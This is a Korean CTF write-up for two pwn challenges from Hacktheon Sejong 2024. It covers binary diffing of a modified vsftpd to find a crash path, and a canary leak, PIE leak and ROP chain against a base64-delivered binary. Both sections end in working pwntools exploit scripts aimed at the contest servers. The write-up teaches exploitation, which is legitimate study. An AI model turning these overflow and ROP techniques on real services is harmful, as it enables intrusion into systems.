---
title: "2024 Hacktheon Sejong CTF Write up"
date: 2024-05-29 +0900
categories: [WRITE-UP]
tags: ['writeup', 'ctf', '2024']
image:
    path: "/assets/img/posts/hacktheon_2024_writeup/hacktheon.jpg"
    alt: "Hacktheon Sejong CTF"
    lqip: "/assets/img/posts/hacktheon_2024_writeup/hacktheon.jpg"
---

## Findiff - [pwn]

- 💎 **pts : 729pts**

### 1. Abstract

- *Binary Diffing (Bindiff)*
- *Buffer Overflow*

### 2. Analysis

해당 문제는 바이너리 파일을 총 2개 제공해준다. 처음에는 왜 2개의 파일을 제공해 주었는지 모르겠지만, 문제의 제목과 설명에서 그 힌트를 얻을 수 있었다.

![Untitled](/assets/img/posts/hacktheon_2024_writeup/Untitled.png)

- vsftpd : 원본 vsftpd 바이너리
- vvsftpd : 운영측에서 수정한 바이너리

2개의 바이너리를 비교 분석하기 위해서 bindiff를 이용하여 바이너리 디핑을 했고, 유사도가 떨어진 부분을 발견했다.

- `str_netfd_alloc`
- `init_connection`

![Untitled](/assets/img/posts/hacktheon_2024_writeup/Untitled%201.png)

#### 2-1. init_connection

vvsftpd 바이너리에서 `signal()` 을 통해 11번 Signal인 SIGSEGV 발생할 때 `getFlag()` 함수를 호출하는 것을 볼 수 있다.

- 이를 통해 Memory Access Violation이 일어났을 때 Flag를 얻을 수 있다는 것을 알 수 있다.

```c
void __fastcall __noreturn init_connection(_DWORD *a1)
{
  signal(11, (__sighandler_t)getFlag);
  if ( tunable_setproctitle_enable )
    vsf_sysutil_setproctitle("not logged in");
  vsf_cmdio_set_alarm((__int64)a1);
  check_limits(a1);
  if ( tunable_ssl_enable && tunable_implicit_ssl )
    ssl_control_handshake(a1);
  if ( tunable_ftp_enable )
    emit_greeting((__int64)a1);
  parse_username_password(a1);
}
```

#### 2-2. str_netfd_alloc

vvsftpd에서는 24번 째 줄에서 함수 호출 후 리턴 값에 대한 예외 처리를 해주는 코드가 없기 때문에 함수 호출 시 예외가 발생하였을 때 프로그램이 비정상 종료될 수 있다.

```c
/****** vsftp ******/
if ( v19 + v14 != v10 + v9 )
  bug((__int64)"poor buffer accounting in str_netfd_alloc");
if ( !v14 )
  return 0xFFFFFFFFLL;
v15 = a6(a1, v19, v14);
if ( (unsigned int)vsf_sysutil_retval_is_error(v15) )
  die("vsf_sysutil_recv_peek");
if ( !v15 )
  return 0LL;
v18 = v15;

/****** vvsftp ******/
if ( v19 + v14 != v10 + v9 )
  bug((__int64)"poor buffer accounting in str_netfd_alloc");
if ( !v14 )
  return 0xFFFFFFFFLL;
v15 = a6(a1, v19, v14);
if ( !v15 )
  return 0LL;
v18 = v15;
```

### 3. Exploit

- Flag를 얻기 위해 `str_netfd_alloc()` 에서 예외 처리가 없다는 것을 이용하여 Memory Access Violation을 유도하여 SIGSEGV를 발생시켜야 한다.

`str_netfd_alloc()` 에서 6번째 매개변수의 함수 포인터를 호출한다.

```c
__int64 __fastcall str_netfd_alloc(__int64 a1, __int64 a2, char a3, __int64 a4, unsigned int a5, __int64 (__fastcall *a6)(__int64, __int64, _QWORD), __int64 (__fastcall *ssl_read_adapter)(__int64, __int64, _QWORD))
{
  __int64 v9; // [rsp+10h] [rbp-40h]
  unsigned int v10; // [rsp+18h] [rbp-38h]
  unsigned int i; // [rsp+38h] [rbp-18h]
  unsigned int v13; // [rsp+38h] [rbp-18h]
  unsigned int v14; // [rsp+3Ch] [rbp-14h]
  unsigned int v15; // [rsp+40h] [rbp-10h]
  int v16; // [rsp+40h] [rbp-10h]
  int v17; // [rsp+40h] [rbp-10h]
  unsigned int v18; // [rsp+44h] [rbp-Ch]
  __int64 v19; // [rsp+48h] [rbp-8h]

  v9 = a4;
  v10 = a5;
  v19 = a4;
  v14 = a5;
  str_empty(a2);
LABEL_2:
  if ( v19 + v14 != v10 + v9 )
    bug((__int64)"poor buffer accounting in str_netfd_alloc");
  if ( !v14 )
    return 0xFFFFFFFFLL;
  v15 = a6(a1, v19, v14);
  if ( !v15 )
    return 0LL;
  v18 = v15;
```

`str_netfd_alloc()` 을 호출한 `ftp_getline()` 함수를 보면 6번째 매개변수에 해당하는 변수에 `plain_peek_adapter()`를 저장한다.

```c
__int64 __fastcall ftp_getline(_DWORD *cmd_base, __int64 cmd, __int64 cmd_base_16)
{
  __int64 result; // rax
  int v4; // [rsp+2Ch] [rbp-14h]
  __int64 (__fastcall *v5)(__int64, __int64, _QWORD); // [rsp+30h] [rbp-10h]
  __int64 (__fastcall *v6)(__int64, __int64, unsigned int); // [rsp+38h] [rbp-8h]

  if ( cmd_base[104] && cmd_base[116] )
  {
    priv_sock_send_cmd((unsigned int)cmd_base[118], 4LL);
    v4 = priv_sock_get_int((unsigned int)cmd_base[118]);
    if ( v4 >= 0 )
      priv_sock_get_str((unsigned int)cmd_base[118], cmd);
    result = (unsigned int)v4;
  }
  else
  {
    v5 = (__int64 (__fastcall *)(__int64, __int64, _QWORD))plain_peek_adapter;
    v6 = plain_read_adapter;
    if ( cmd_base[104] )
    {
      v5 = (__int64 (__fastcall *)(__int64, __int64, _QWORD))ssl_peek_adapter;
      v6 = ssl_read_adapter;
    }
    result = str_netfd_alloc(
               (__int64)cmd_base,
               cmd,
               10,
               cmd_base_16,
               0x4000u,
               v5,
               (__int64 (__fastcall *)(__int64, __int64, _QWORD))v6);
  }
  return result;
}
```

`plain_peek_adapter()` 는 내부에서 `vsf_sysutil_recv_peek()` 을 호출한다.

```c
__int64 __fastcall plain_peek_adapter(__int64 a1, void *a2, unsigned int a3)
{
  return vsf_sysutil_recv_peek(0, a2, a3);
}
```

`vsf_sysutil_recv_peek()` 내부에는 `recv()` 함수를 호출하는 부분이 있다.

```c
__int64 __fastcall vsf_sysutil_recv_peek(unsigned int a1, void *a2, unsigned int a3)
{
  int v5; // [rsp+18h] [rbp-8h]
  int v6; // [rsp+1Ch] [rbp-4h]

  do
  {
    v5 = recv(a1, a2, a3, 2);
    v6 = *__errno_location();
    vsf_sysutil_check_pending_actions(1LL, (unsigned int)v5, a1);
  }
  while ( v5 < 0 && v6 == 4 );
  return (unsigned int)v5;
}
```

`recv()` 가 받는 버퍼의 크기는 `0x4000` 이므로 해당 크기보다 큰 사이즈의 데이터를 보내면 buffer overflow가 발생하여 비정상 종료가 될 수 있다.

![Untitled](/assets/img/posts/hacktheon_2024_writeup/Untitled%202.png)

#### 3-1. Exploit Code

```python
from pwn import *

context.log_level = 'debug'

p = remote('hto2024-nlb-fa01ec5dc40a5322.elb.ap-northeast-2.amazonaws.com', 5000)

p.recvline()

login_payload = b'USER ANONYMOUS'
p.sendline(login_payload)
p.recvline()

payload = b'A' * 0x4001
p.sendline(payload)

p.interactive()
```

## Intelitigation - [pwn]

- 💎 **pts : 807pts**

### 1. Abstract

- *base64 decoding*
- *AEG*
- *Stack Based Buffer Overflow*
- *ROP*

### 2. Analysis

이 문제는 서버에 접속하면 base64로 인코딩 된 데이터를 출력한다. 해당 데이터를 디코딩하면 ELF 형식의 실행파일을 얻을 수 있다.

```
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAABEAAAAAAABAAAAAAAAAALAxAAAAAAAAAAAAAEAAOAAN
AEAAHQAcAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA
AAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
...
```

주요 함수들만 분석해보면 다음과 같다.

#### 2.1 sub_1324()

- 입력값을 받아 buf에 저장
- buf값을 출력
- `read()` 에서 buf 배열 크기 보다 큰 값을 입력할 수 있어 BOF 발생

```c
unsigned __int64 sub_1324()
{
  __int64 buf[2]; // [rsp+0h] [rbp-210h] BYREF
  char v2[496]; // [rsp+10h] [rbp-200h] BYREF
  unsigned __int64 v3; // [rsp+208h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("input> ");
  buf[0] = 0LL;
  buf[1] = 0LL;
  memset(v2, 0, sizeof(v2));
  read(0, buf, 0x300uLL);
  printf("Your input> ");
  printf("%s", (const char *)buf);
  return v3 - __readfsqword(0x28u);
}
```

#### 2.2 sub_124e()

- orw 역할을 하는 함수
- 매개변수로 파일 이름을 받아 해당 파일의 내용을 출력

```c
ssize_t __fastcall sub_124E(const char *a1)
{
  int fd; // [rsp+1Ch] [rbp-4h]

  fd = open(a1, 0);
  read(fd, &unk_40C0, 0x64uLL);
  return write(1, &unk_40C0, 0x64uLL);
}
```

### 3. Exploit

#### 3.1 Mitigation

Stack Smashed Protector와 PIE가 걸려 있기 때문에 Memory Leak을 통해 Canary 값과 주소를 알아낼 필요가 있다.

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

#### 3.2 Canary Leak

이 프로그램에서는 입력/출력을 각각 한 번씩만 할 수 있어 Canary을 출력해도 바로 프로그램이 종료된다.

해당 바이너리에서 Canary 값이 저장되는 부분에 값을 쓰는 부분이 있다.

- 8바이트 씩 총 10개의 데이터가 배열 형식으로 저장되어 있으며 가장 아래의 정수가 해당 배열의 인덱스를 나타낸다.

```
0000000000004020  D5 B5 DD 93 17 F1 11 DD  B7 17 35 73 51 99 B9 31
0000000000004030  D3 9F 55 F5 F3 11 F7 D7  DB 73 59 79 D3 33 FD 1F
0000000000004040  5D F3 7F 7F D7 B9 59 DD  9F 5D 5B 7D 9D D9 3F D7
0000000000004050  F7 31 D9 F1 B1 3B D5 7D  3F 91 1F 59 5B D3 97 93
0000000000004060  9B 59 F9 3D D1 D3 7B F5  71 F1 D9 FD 1D BB 19 73
0000000000004070  01 00 00 00 00 00 00 00  ?? ?? ?? ?? ?? ?? ?? ?
```

Canary 값을 유추할 수 있으므로 정상적으로 ret2main이 가능하다.

- return에 해당하는 주소에서 1바이트만 overwrite하여 main으로 리턴이 가능하다.

#### 3.3 ROP

orw를 이용하여 flag를 출력하기 위해서는 매개변수로 flag 파일이름을 전달해주어야 한다. 하지만 해당 바이너리에는 `pop rdi; ret;` 가젯이 없어서 다른 가젯을 찾아야 했다.

그래서 찾은 가젯이 `mov rdi, rsp; ret;` 가젯이다.

- stack에 flag 문자열을 저장하고 문자열이 저장된 stack 주소를 `rdi` 에 저장한다.

```
0x00000000000012b4: mov rdi, rsp; pop r8; ret;
```

#### 3-4. Exploit Code

최종적으로 exploit flow는 다음과 같다.

- 첫 번째 입력에서 Code Section 주소 Leak 및 ret2main
- orw 함수의 주소를 구함.
- ROP를 통해 orw 함수 호출.

```python
from pwn import *
import base64

p = remote('hto2024-nlb-fa01ec5dc40a5322.elb.ap-northeast-2.amazonaws.com', 5001)
start = 0x3020

p.recvline()
p.recvline()
binary = p.recvline()
data = base64.b64decode(binary)

idx = int.from_bytes(data[0x3070:0x3071], 'big')
start = 0x3020 + idx * 8
canary = data[start:start+8]
print(canary)

payload = b'A' * 0x208
payload += canary
payload += b'B' * 8
payload += b'\xed'

p.sendafter('> ', payload)

p.recvuntil(b'B' * 8)
leak = p.recv(6) + b'\x00\x00'
leak = u64(leak)

code_base = leak - 0x13ED
popret = code_base + 0x12b4 # mov rdi, rsp; pop r8; ret;
orw = code_base + 0x124E   # orw
print(hex(code_base))

payload = b'A' * 0x208
payload += canary
payload += b'B' * 8
payload += p64(popret)
payload += b'.//flag\x00'
payload += p64(orw)
p.sendafter('> ', payload)

p.interactive()

```